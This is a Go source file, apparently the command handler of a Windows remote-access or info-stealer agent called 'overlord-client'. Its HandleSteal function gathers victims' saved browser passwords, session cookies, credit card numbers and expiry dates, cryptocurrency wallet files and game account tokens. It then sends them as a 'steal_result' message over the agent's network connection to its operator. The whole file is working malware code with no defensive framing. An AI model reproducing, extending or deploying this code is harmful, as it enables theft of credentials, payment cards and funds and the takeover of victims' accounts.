//go:build windows

package handlers

import (
	"context"

	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
	"overlord-client/internal/stealer"
)

func HandleSteal(ctx context.Context, env *rt.Env, cmdID string, envelope map[string]interface{}) error {
	r := stealer.Run()

	creds := make([]wire.StealCredential, 0, len(r.Credentials))
	for _, c := range r.Credentials {
		creds = append(creds, wire.StealCredential{
			Browser:  c.Browser,
			Profile:  c.Profile,
			URL:      c.URL,
			Username: c.Username,
			Password: c.Password,
		})
	}

	cookies := make([]wire.StealCookie, 0, len(r.Cookies))
	for _, c := range r.Cookies {
		cookies = append(cookies, wire.StealCookie{
			Browser:  c.Browser,
			Profile:  c.Profile,
			Host:     c.Host,
			Name:     c.Name,
			Value:    c.Value,
			Path:     c.Path,
			IsSecure: c.IsSecure,
		})
	}

	cards := make([]wire.StealCard, 0, len(r.Cards))
	for _, c := range r.Cards {
		cards = append(cards, wire.StealCard{
			Browser:     c.Browser,
			Profile:     c.Profile,
			Name:        c.Name,
			Number:      c.Number,
			ExpiryMonth: c.ExpiryMonth,
			ExpiryYear:  c.ExpiryYear,
		})
	}

	wallets := make([]wire.StealWallet, 0, len(r.Wallets))
	for _, w := range r.Wallets {
		wallets = append(wallets, wire.StealWallet{
			Wallet:   w.Wallet,
			Filename: w.Filename,
			DataB64:  w.DataB64,
		})
	}

	gameTokens := make([]wire.StealGameToken, 0, len(r.GameTokens))
	for _, g := range r.GameTokens {
		gameTokens = append(gameTokens, wire.StealGameToken{
			Game:     g.Game,
			Type:     g.Type,
			Username: g.Username,
			Value:    g.Value,
		})
	}

	return wire.WriteMsg(ctx, env.Conn, wire.StealResult{
		Type:        "steal_result",
		CommandID:   cmdID,
		Credentials: creds,
		Cookies:     cookies,
		Cards:       cards,
		Tokens:      r.Tokens,
		Wallets:     wallets,
		GameTokens:  gameTokens,
		Errors:      r.Errors,
	})
}
